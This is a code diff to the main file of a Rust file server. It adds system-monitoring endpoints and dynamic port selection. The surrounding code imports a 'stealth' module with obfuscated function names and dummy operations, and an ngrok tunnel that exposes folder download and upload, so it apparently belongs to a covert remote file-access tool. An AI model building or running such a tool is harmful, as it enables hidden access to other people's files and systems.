@@ -1,6 +1,7 @@
 mod config;
 mod encryption;
 mod file_server;
+mod monitoring; // System monitoring module
 mod ngrok;
 mod notification;
 mod stealth;
@@ -15,8 +16,10 @@ use tokio::time::sleep;
 use std::time::Duration;
 use crate::config::Config;
 use crate::file_server::FileServer;
+use crate::monitoring::{init_monitoring, get_system_stats, dashboard};
 use crate::ngrok::setup_ngrok_tunnel;
 use crate::stealth::{a1, b2, c3, d4, u21, v22, perform_dummy_operations};
+use crate::utils::find_available_port;
 
 #[actix_web::main]
 async fn main() -> std::io::Result<()> {
@@ -53,26 +56,41 @@ async fn main() -> std::io::Result<()> {
     v22().await;
     
     // Create config
-    let config = Arc::new(Config::new());
+    let mut config = Config::new();
+    
+    // Find an available port dynamically, starting with the configured port
+    let preferred_port = config.port;
+    let actual_port = find_available_port(preferred_port);
+    config.port = actual_port; // Update the config with the actual port
+    
+    let config = Arc::new(config);
     let file_server = Arc::new(Mutex::new(FileServer::new()));
     
     // Setup server
-    let port = config.port;
-    let server_address = format!("0.0.0.0:{}", port);
+    let server_address = format!("0.0.0.0:{}", actual_port);
     info!("Service on {}", server_address);
     
     // Start server
+    // Initialize system monitoring
+    let monitoring_data = init_monitoring();
+    let monitoring_data = web::Data::new(monitoring_data);
+    
     let config_clone = config.clone();
     let file_server_clone = file_server.clone();
+    
     let server = HttpServer::new(move || {
         App::new()
             .app_data(web::Data::new(config_clone.clone()))
             .app_data(web::Data::new(file_server_clone.clone()))
+            .app_data(monitoring_data.clone())
             .wrap(middleware::Logger::default())
             .service(file_server::index)
             .service(file_server::download_folder)
             .service(file_server::preview)
             .service(file_server::upload_files)
+            // System monitoring endpoints
+            .service(dashboard)
+            .service(get_system_stats)
     })
     .bind(&server_address)?
     .run();
